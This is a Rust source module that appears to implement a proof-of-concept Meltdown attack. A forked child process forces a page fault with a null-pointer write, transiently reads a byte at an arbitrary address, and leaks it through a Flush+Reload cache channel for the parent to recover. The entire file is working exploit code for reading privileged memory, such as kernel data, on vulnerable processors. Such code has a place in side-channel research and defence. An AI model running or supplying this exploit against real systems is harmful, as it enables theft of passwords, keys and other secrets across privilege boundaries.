use crate::fr::FlushReload;
use nix::sys::wait::waitpid;
use nix::unistd::{fork, ForkResult};

pub struct MeltdownUS {
    channel: FlushReload,
}

impl MeltdownUS {
    pub fn new() -> MeltdownUS {
        MeltdownUS {
            channel: FlushReload::new(),
        }
    }

    fn cause_transient_window() {
        unsafe {
            let null_ptr: *mut u8 = std::ptr::null_mut();
            *null_ptr = 0;
            std::hint::black_box(null_ptr);
        }
    }

    pub fn read(&self, addr: *const u8) -> Option<u8> {
        match unsafe { fork() } {
            Ok(ForkResult::Child) => {
                self.channel.reset();

                MeltdownUS::cause_transient_window(); // Will raise page fault
                let secret = unsafe { *addr };
                self.channel.leak_without_prev_reset(secret);

                std::process::exit(0);
            }
            Ok(ForkResult::Parent { child }) => {
                let _ = waitpid(child, None);
                self.channel.get()
            }
            Err(_) => None,
        }
    }
}
